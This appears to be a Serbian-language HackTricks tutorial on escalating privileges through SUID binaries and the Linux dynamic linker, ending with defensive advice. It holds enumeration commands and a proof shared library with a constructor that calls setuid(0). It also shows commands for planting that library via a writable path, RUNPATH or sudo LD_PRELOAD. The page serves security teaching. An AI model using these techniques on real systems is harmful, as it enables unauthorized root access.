# Abuse SUID Shared Library-ja i Linker-a

{{#include ../../banners/hacktricks-training.md}}

SUID binarni fajlovi se obično proveravaju zbog direktnog izvršavanja komandi, ali custom SUID programi mogu biti ranjivi i preko dynamic linker-a. Zajednička karakteristika je jednostavna: privilegovani executable učitava code sa putanje ili iz konfiguracije na koju korisnik sa nižim privilegijama može da utiče.

Ova stranica se fokusira na generičke obrasce tehnika: nedostajuće library-je, writable library direktorijume, `RPATH`/`RUNPATH`, `LD_PRELOAD` kroz sudo, linker konfiguraciju i SUID hardlink zabunu.

## Brza enumeracija

Počnite pronalaženjem neuobičajenih SUID fajlova i proverom da li su dynamically linked:
```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```
Usredsredite se na nestandardne lokacije, prilagođene putanje aplikacija, binarne datoteke u vlasništvu korisnika root koje se nalaze izvan direktorijuma kojima upravlja package manager i dependencies koje se učitavaju iz direktorijuma sa dozvolom za upis.

Korisne provere dozvola za upis:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```
## Missing Shared Object Injection

Neki prilagođeni SUID binarni fajlovi pokušavaju da učitaju shared object koji ne postoji. Ako se putanja koja nedostaje nalazi u direktorijumu kojim upravlja napadač, binarni fajl može učitati kod koji je dostavio napadač sa privilegijama efektivnog korisnika.

Pronađite neuspešne pokušaje pronalaženja library fajlova:
```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```
Ako binarni fajl pretražuje putanju sa dozvolom upisivanja za `libexample.so`, minimalna biblioteka za dokaz može koristiti konstruktor. Tokom validacije, dokaz uticaja treba da ostane bezopasan:
```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
setuid(0);
setgid(0);
system("id > /tmp/suid-so-ran");
}
```
Napravite ga sa tačnim nazivom datoteke koju binarni fajl pokušava da učita:
```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```
Uslov koji se može iskoristiti nije samo nedostajuća biblioteka. Napadač mora moći da postavi kompatibilni shared object na putanju koju će privilegovani loader prihvatiti.

## Direktorijum biblioteke sa dozvolom upisa

Ponekad sve zavisnosti postoje, ali je jedan od direktorijuma koji se koriste za njihovo razrešavanje upisiv. To može omogućiti zamenu učitane biblioteke ili postavljanje biblioteke višeg prioriteta sa istim nazivom.

Proverite putanje zavisnosti:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```
Ako je direktorijum upisiv, proverite to pristupom bezbednim za kopiranje u lab okruženju. Zamena sistemskih biblioteka na aktivnom hostu može da pokvari autentikaciju, upravljanje paketima ili servise kritične za pokretanje sistema.

## RPATH i RUNPATH

`RPATH` i `RUNPATH` su unosi dinamičke sekcije koji loaderu govore gde da traži biblioteke. Opasni su u SUID programima kada upućuju na direktorijume u koje attacker može da upisuje.

Otkrivanje:
```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```
Primer rizičnog izlaza:
```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```
Ako je u `/opt/app/lib` omogućeno upisivanje, a binarnoj datoteci je potreban `libcustom.so`, napadač će možda moći da tamo postavi zlonamerni `libcustom.so`:
```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```
`RPATH` i `RUNPATH` nisu identični u svim detaljima rezolucije, ali je za pregled eskalacije privilegija praktično pitanje isto: da li SUID binary pretražuje direktorijum u koji attacker može da upisuje u potrazi za imenom library-ja?

## LD_PRELOAD, LD_LIBRARY_PATH i SUID

Kod normalnih programa, `LD_PRELOAD` i `LD_LIBRARY_PATH` mogu da nametnu ili utiču na učitavanje shared object-a. Kod SUID programa, dynamic loader obično prelazi u secure-execution mode i ignoriše opasne environment varijable.

To znači da plain SUID binary obično nije ranjiv samo zato što user može da postavi `LD_PRELOAD`:
```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```
Uobičajeni izuzetak je pogrešna konfiguracija za `sudo`. Ako `sudo -l` prikazuje da je promenljiva kao što je `LD_PRELOAD` ili `LD_LIBRARY_PATH` očuvana, komanda dozvoljena kroz sudo može učitati kod pod kontrolom napadača:
```bash
sudo -l
# Look for env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```
Nemojte mešati sledeće slučajeve:

- `LD_PRELOAD` protiv običnog SUID binary-ja: obično je blokiran secure execution mehanizmom.
- `LD_PRELOAD` sačuvan preko sudo-a: potencijalno exploitable.
- Nedostajući `.so` u writable putanji: exploitable kada SUID binary prirodno učitava tu putanju.
- `RPATH`/`RUNPATH` ka writable direktorijumu: exploitable kada potrebna biblioteka može da se kontroliše.
- Pristup upisu u `/etc/ld.so.preload` ili linker konfiguraciju: utiče na ceo sistem i ima veliki uticaj.

## Konfiguracija linker-a

Dynamic linker takođe čita sistemsku konfiguraciju kao što su `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, linker cache i, u nekim slučajevima, `/etc/ld.so.preload`.

Najvažnije provere:
```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```
Konfiguracija linker-a sa dozvolom za upis obično je ozbiljnija od jedne ranjive SUID binarne datoteke, jer može uticati na mnoge dinamički linkovane procese. `/etc/ld.so.preload` je posebno opasan jer može prinudno učitati shared object u privilegovane procese.

## SUID Hardlink Confusion

Hardlink-ovi mogu učiniti da se isti SUID inode pojavi pod više imena. Ovo je korisno za skrivanje privilegovanog helper-a, zbunjivanje procesa čišćenja ili zaobilaženje naivne provere zasnovane na putanji.

Pronađite SUID datoteke sa više od jednog linka:
```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```
Ispitajte sve putanje do istog inode-a:
```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```
Zloupotreba nije u tome što hardlink menja dozvole. Zloupotreba je zabuna u putanji: privilegovani inode može biti dostupan preko imena koje administratori ili skripte ne očekuju. Za detaljniji opis inode-a i postupka rada sa hardlinkovima, pogledajte [Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.md).

## Odbrambene napomene

- SUID binarne fajlove održavajte minimalnim, proveravajte i, gde je moguće, upravljajte njima putem package manager-a.
- Izbegavajte `RPATH`/`RUNPATH` unose koji pokazuju na direktorijume u koje korisnici mogu upisivati ili kojima upravlja aplikacija.
- Direktorijumi sa library fajlovima treba da budu u vlasništvu root korisnika i bez dozvole za upis običnih korisnika.
- Nemojte kroz sudo zadržavati `LD_PRELOAD`, `LD_LIBRARY_PATH` ili slične loader promenljive.
- Nadzirite `/etc/ld.so.preload`, `/etc/ld.so.conf`, `/etc/ld.so.conf.d/` i neočekivane SUID fajlove.
- Proveravajte SUID fajlove povezane hardlinkovima i istražite prilagođene SUID wrapper-e izvan standardnih sistemskih putanja.
{{#include ../../banners/hacktricks-training.md}}
